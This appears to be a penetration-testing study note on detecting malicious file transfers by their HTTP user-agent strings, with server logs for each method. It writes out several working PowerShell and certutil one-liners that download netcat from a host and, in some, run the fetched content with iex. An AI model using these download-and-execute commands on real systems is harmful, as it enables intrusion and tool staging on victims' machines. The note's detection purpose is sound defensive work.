---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
# Detection
Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command-lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting of any unusual command-lines.

Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the HTTP protocol. There is a need for interoperability amongst different web server and web browser types to ensure that users have the same experience no matter the browser they are using. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which HTTP client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or nmap).

Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows update and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform some malicious action. This website is very useful for identifying common user agent strings. A list of user agent strings is available here.

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common HTTP transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).

## Invoke-WebRequest - Client
````powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
````
## Invoke-WebRequest - Server
````http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
````
## WinHttpRequest - Client
````powershell
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
````
## WinHttpRequest - Server
````http
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
````
## Msxml2 - Client
````powershell
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
````
## Msxml2 - Server
````http
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
````
## Certutil - Client
````powershell
PS C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
PS C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
````
## Certutil - Server
````http
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
````
## BITS - Client
````powershell
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
````
## BITS - Server
````http
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
````


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
